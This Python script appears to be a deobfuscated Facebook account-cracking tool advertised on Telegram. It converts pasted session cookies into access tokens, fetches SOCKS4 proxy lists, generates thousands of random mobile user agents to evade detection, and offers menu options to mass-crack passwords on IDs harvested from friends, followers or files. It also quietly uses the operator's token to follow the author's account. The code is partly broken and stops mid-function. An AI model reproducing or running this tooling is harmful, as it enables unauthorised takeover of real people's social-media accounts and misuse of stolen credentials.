import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import socket
# iphane = socket.gethostname()
# ipp = socket.gethostbyname(iphane)
# url = requests.get('https://pastebin.com/USBwETwe').text
# if ipp in url:
    # os.system('clear')
# else:
    # print('')
    # print('انتهئ التفعيل انضم للقناه للحصول ع احدث نسخه @ K_Q_A')
    # exit()

try:
    import rich
except:
    cetak(nel('\t• Sedang Menginstall Modul Rich •'))
    os.system('pip install rich')

try:
    import stdiomask
except:
    cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
    os.system('pip install stdiomask')

try:
    import requests
except:
    Z = '\x1b[1;31m'
R = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
C = '\x1b[1;97m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
E = '\x1b[1;31m'
B = '\x1b[2;36m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
print('\n')
token = input(B + 'token : ' + F)
print('\n')
ID = input(B + 'ID    : ' + F)
os.system('clear')
cetak(nel('\t• Sedang Menginstall Modul Requests •'))
pretty.install()
CON = sol()
user_agent = [
    'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]',
    'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]',
    'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RQ2A.210305.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 10; zh-cn; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi 8A Pro Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 9; Redmi 8A Pro Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPR/50.0.2254.149183',
    'Mozilla/5.0 (Linux; U; Android 9; en-us; Redmi Note 8 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.7.27 swan-mibrowser']
uas_bawaan = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
uas_nokiac2 = 'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile'
uas_nokiax20 = 'Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36'
uas_nokiax = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
uas_samsungse = 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
uas_redmi9a = 'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
uas_nokiaxl = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12'
uas_chromelinux = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36'
uas_j7prime = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501'
uas_tes = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)'
uas_random = random.choice([
    'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36',
    'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
    'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'])
uas_nokiac3 = 'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
uas_nokia5plus = 'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
uas_random2 = random.choice([
    'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
    'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
    'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:
    print(' ')
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = '11; Redmi Note 5A Lite)'
    e = random.randrange(100, 9999)
    f = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Chrome/96.0.4664.45 Mobile Safari/537.36'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'M2101K6G'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '5.0',
        '6.0',
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'RMX3396'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 13;'
    b = random.choice([
        '8.1.0',
        '9',
        '10',
        '11',
        '12',
        '13'])
    c = random.choice([
        'RMX3396'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    a = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'V2147'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
    uaku2 = f'''{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        '2201116PG'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'RMX3115 Build/SP1A.210812.016; wv'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'SHARK KTUS-H0'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (iPhone;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'CPU iPhone OS 16_0 like Mac OS X)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/605.1.15 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Infinix X688B'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 10;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Mi 9T Pro Build/QKQ1.190825.002; wv)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
asu = random.choice([
    m,
    k,
    h,
    u,
    b])
dic = {
    '12': 'December',
    '11': 'November',
    '10': 'October',
    '9': 'September',
    '8': 'August',
    '7': 'July',
    '6': 'June',
    '5': 'May',
    '4': 'April',
    '3': 'March',
    '2': 'February',
    '1': 'January' }
dic2 = {
    '12': 'Devember',
    '11': 'November',
    '10': 'October',
    '09': 'September',
    '08': 'August',
    '07': 'July',
    '06': 'June',
    '05': 'May',
    '04': 'April',
    '03': 'March',
    '02': 'February',
    '01': 'January' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def Login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie_by_dyno':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu()
        except KeyError:
            login_HANI()
        except requests.exceptions.ConnectionError:
            dynox1 = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
            dynox2 = mark(Loginx1, style='red')
            sol().print(dynox2, style='cyan')
            exit()
    except IOError:
        login_HANI()

def login_HANI():
    
    try:
        asu = random.choice([
            m,
            k,
            h,
            b,
            u])
        os.system('clear')
        banner()
        print('')
        print('')
        cookie = input(f'''[{H}={X}]  Cookies :{asu} ''')
        open('.cok.txt', 'w').write(cookie)
        with requests.Session() as rsn:
            
            try:
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate' })
                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie': cookie_by_dyno })
                if '"access_token":' in str(response.headers):
                    open('.token.txt', 'w').write(token)
                    print('')
                    print('')
                    print(f'''{x}[{h}√{x}]{h} Successful login.{x} ''')
                    time.sleep(1)
                else:
                    print('')
                    print('')
                    print('%sكوكيز غير صالح ✖%s' % (m, p))
            except Exception as ee:
                print('')
                print('')
                print('كوكيز غير صالح ✖ ')

    except Exception as e:
        try:
            os.system('rm -f .token.txt')
            os.system('rm -f .cok.txt')
            print('')
            print('')
            print(f'''{x}[{h}√{x}]{h} Successful login.{x} ''')
            time.sleep(1)
            print(e)
            exit()
        except Exception as e:
            pass


def bot():
    
    try:
        requests.post('https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s' % tokenku)
    except:
        pass



def banner():
    print('⋘𝐇𝐀𝐍𝐈⋙')


def menu(id):
    
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except:
        print('[×] Cookies Kadaluarsa ')
        time.sleep(5)
        login_lagi334()
    os.system('clear')
    banner()



def menu():
    ip = requests.get('https://api.ipify.org').text
    os.system('clear')
    print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
    banner()
    print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
    print('\x1b[38;5;208mTelegram ᯼ @K_Q_A  ')
    print('')
    print('[v33]')
    print(f'''»  Your IP : {ip}''')
    print('')
    print('» 1- Fishing from friends : من الاصدقاء  ')
    print('» 2- Fishing from followers : من المتابعين ')
    print('» 3- Crack File : مــن مــلــف  ')
    print('» 0- login out : تسجيل خروج   ')
    print(('—'*25)+'\n• DeCoDe By @H_S_W_M •\n'+('—'*25))
    _____alvino__adijaya_____ = input('\n[=] chose : ')
    if _____alvino__adijaya_____ in ('1',):
        dump_massal()
    elif _____alvino__adijaya_____ in ('2',):
        follower()
    elif _____alvino__adijaya_____ in ('3',):
        TakeFile()
    elif _____alvino__adijaya_____ in ('0',):
        O()
        exit()

def follower():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        jum = int(input('[>>] CRACK ID LIMIT : اكتب عدد الايديات '))
    except ValueError:
        print('{k}[✖] NOT PUBLIC ID ')
        time.sleep(3)
        follower()
    if jum<1:
        print('[✖] Your limit error')
        time.sleep(3)
        follower()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1        
        kl = input('[*] ID >> '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
